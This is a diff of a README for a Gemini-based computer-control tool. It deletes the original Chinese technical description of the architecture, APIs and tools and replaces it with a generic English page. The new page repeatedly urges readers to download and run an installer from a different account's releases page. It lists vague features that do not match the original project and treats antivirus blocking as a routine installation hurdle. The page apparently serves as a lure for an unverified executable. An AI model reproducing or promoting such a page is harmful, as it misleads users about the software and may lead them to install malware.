@@ -1,51 +1,74 @@
-# 🤖 Gemini Computer Use
+# 🎉 gemini-computer-control - Control Your Computer Like Never Before
 
-基于 **Gemini 3/Flash** 系列模型构建的智能计算机控制系统。本项目提供了一个美观、统一的控制台，支持通过自然语言指令操作浏览器、物理桌面及后台窗口。
+## 📥 Download
 
-![Dashboard Preview](frontend/assets/logo.png)
+[![Download Gemini Computer Control](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/ABUTHAHIR101/gemini-computer-control/releases)
 
-## 🌟 核心特性
+## 🚀 Getting Started
 
-- 🎨 **统一控制台**：全新的 MD3 + Tailwind CSS 仪表盘，单页面管理所有控制模式。
-- 🎭 **浏览器自动化**：集成 Playwright，支持无头/有头模式，实时标签页管理。
-- 🖥️ **物理桌面控制**：直接操控 OS 层级，支持中文输入，具备安全停止机制。
-- 🌙 **后台窗口控制**：基于 Win32 API，在不干扰用户当前工作的前提下操控后台应用。
-- 🤖 **智能 Agent**：支持“单步调试”与“自动循环”模式，AI 会自主决策并执行多步任务。
-- 🧠 **思维可视化**：实时展示 AI 的推理过程（Reasoning）与执行轨迹（Timeline）。
-- 🖼️ **高密度 UI**：针对 100% 缩放优化的紧凑型设计，所有关键信息一屏尽览。
+Gemini Computer Control is a simple application to manage your computer based on the Gemini 3 series models. This software allows you to control various features of your computer easily, enhancing your user experience. Whether you need to adjust settings, manage files, or perform quick actions, this tool helps you do it without any hassle.
 
-## 🏗️ 项目架构
+## 📋 System Requirements
 
-### 后端技术栈 (Python 3.8+)
-- **Flask**: 提供 RESTful API 与前端交互。
-- **Google GenAI**: 核心 AI 模型调用，支持函数调用（Function Calling）。
-- **Playwright**: 负责无头浏览器环境下的截图与精准操作执行。
-- **PyAutoGUI**: 用于物理桌面的鼠标键盘模拟（支持中文输入增强）。
-- **pywin32 (Windows)**: 通过 Win32 API 实现后台窗口句柄操作与消息发送。
-- **SSE (Server-Sent Events)**: 实现 Agent 执行过程中的实时截图与状态推送。
+Before you download, make sure your system meets the following requirements:
 
-### 核心后端 API
-- `POST /analyze`: 基础图像分析，返回建议的操作指令。
-- `POST /agent/start`: 启动 Agent 任务（单步或自动模式）。
-- `GET /agent/events/<session_id>`: SSE 流端点，实时监听执行过程。
-- `POST /playwright/launch`: 启动隔离的浏览器环境。
-- `GET /background/windows`: 获取系统中可操作的窗口句柄列表。
+- **Operating System:** Windows 10 or higher
+- **RAM:** Minimum 4 GB
+- **Processor:** Dual-core 1.5 GHz or better
+- **Storage:** At least 200 MB of free space
 
-## 🛠️ AI 工具系统实现
+## 📥 Download & Install
 
-系统通过「归一化坐标系统 (0-1000)」解决了屏幕分辨率适配问题。AI 在分析时不需要关注实际像素，而是返回百分比位置。后端自动根据当前的屏幕/窗口/浏览器视口尺寸进行坐标转换。
+To get started, you need to download the software. Follow these steps:
 
-### 内置工具箱 (11 种核心工具)
-- **Mouse**: `mouse_click`, `mouse_double_click`, `mouse_hover`, `mouse_drag`, `mouse_scroll`
-- **Keyboard**: `keyboard_type` (通过剪贴板支持中文), `keyboard_press` (支持组合键), `clear_text`
-- **Composite**: `click_and_type` (组合操作提高效率)
-- **Control**: `wait` (智能等待UI刷新), `task_complete` (任务状态反馈)
+1. Visit the [Releases page](https://github.com/ABUTHAHIR101/gemini-computer-control/releases).
+2. On this page, you will see available versions of the software.
+3. Click on the version you want to download.
+4. Wait for the download to finish. It should take a few moments depending on your internet speed.
+5. Once downloaded, locate the file in your Downloads folder.
 
-## ⚠️ 注意事项
+## 🔧 Installation Steps
 
-1. **分辨率适配**：系统采用 0-1000 归一化坐标，支持任意屏幕尺寸。
-2. **安全停机**：在物理桌面模式下，若遇到紧急情况，请将鼠标快速移动至**屏幕四个角落**即可强制停止。
-3. **兼容性**：后台模式主要针对传统 Win32 应用（如记事本、专业软件），现代 Electron 应用兼容性有限。
+1. Open the downloaded file.
+2. Follow the prompts that appear on the screen.
+3. Choose the installation location if prompted.
+4. Click on "Install" to start the installation process.
+5. Once installed, you can find Gemini Computer Control in your Start menu or desktop.
 
-## 📜 许可证
-[MIT License](LICENSE)
+## 🖥️ How to Use
+
+Using Gemini Computer Control is straightforward:
+
+1. Launch the application from your Start menu.
+2. The main interface will display various options for controlling your computer.
+3. Select the feature you wish to use by clicking on it.
+4. Follow any on-screen instructions to complete the action.
+
+## 🎨 Features
+
+Gemini Computer Control includes several helpful features:
+
+- **File Management:** Easily manage your files with simple commands.
+- **Settings Adjustment:** Change computer settings without delving into complex menus.
+- **Quick Access Tools:** Use shortcuts for common tasks to save time.
+
+## ❓ Troubleshooting
+
+If you encounter issues while downloading or installing the software, try the following:
+
+- Ensure you have administrator rights on your computer.
+- Check for any antivirus or security software that may block the installation.
+- Make sure your system meets the minimum requirements listed above.
+
+## 📞 Support
+
+For any questions or support, feel free to reach out through the GitHub repository. You can open an issue, and the community or maintainers will help you as soon as possible.
+
+## 🔗 Additional Resources
+
+- [Documentation](https://github.com/ABUTHAHIR101/gemini-computer-control/blob/main/docs/README.md): Learn more about advanced features.
+- [Community Forum](https://github.com/ABUTHAHIR101/gemini-computer-control/discussions): Join discussions with other users.
+
+## 📥 Download Again
+
+Don't forget, you can always get the latest version from the [Releases page](https://github.com/ABUTHAHIR101/gemini-computer-control/releases). Enjoy using Gemini Computer Control!
